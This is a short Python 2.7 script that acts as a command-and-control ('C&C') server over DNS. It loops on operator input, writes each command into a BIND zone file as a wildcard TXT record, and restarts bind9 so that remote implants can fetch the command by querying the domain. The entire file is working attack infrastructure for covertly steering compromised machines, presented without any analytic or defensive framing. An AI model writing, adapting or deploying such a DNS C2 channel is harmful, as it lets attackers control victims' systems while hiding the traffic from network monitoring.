#! /usr/bin/env python2.7

import os


def rewritedns(command):
    dnsfile = ''
    
    with open('db_nocommand', 'r') as nocommandfile:
        dnsfile = nocommandfile.read()
    
    with open('/etc/bind/db.bombast.com', 'w') as commandfile:
        commandfile.write(dnsfile + '*\tIN\tTXT\t"' + command + '"')
    
    os.system('/etc/init.d/bind9 restart')

if __name__ == '__main__':
    print('Begin C&C')    

    while(True):
        try:
            command = raw_input('Enter a command: ')
            rewritedns(command)
        except KeyboardInterrupt:
            break

